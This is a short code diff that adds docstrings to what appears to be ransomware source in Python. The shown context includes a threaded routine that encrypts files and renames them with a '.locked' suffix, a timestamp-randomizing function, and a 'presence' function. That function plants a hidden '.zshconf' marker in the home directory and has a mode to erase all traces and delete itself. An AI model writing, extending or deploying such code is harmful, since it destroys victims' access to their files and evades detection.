@@ -284,6 +284,12 @@ class Worker(threading.Thread):
 			self.queue.task_done()
 
 	def encrypt(self, filename, key):
+		"""Encrypt a file with AES
+
+		Arguments:
+			filename -- file to encrypt
+			key -- password
+		"""
 		chunk_size = 65536
 		outputFile = filename + '.locked'
 		filesize = str(os.path.getsize(filename)).zfill(16)
@@ -379,6 +385,17 @@ def randomize_timestamp(file):
 
 
 def presence(mode):
+	"""Set presence mode
+	KILL - remove all system presence, delete self
+	LEAVE - leave a mark on the system to indicate presence
+	CHECK - search for evidence of system presence
+
+	Arguments:
+		mode -- Which mode to set
+
+	Returns:
+		True if successfully set or if presence already on system
+	"""
 	# TODO add more names, randomize
 	touch = f"{str(pathlib.Path.home())}/.zshconf"
 	env = "BASH"
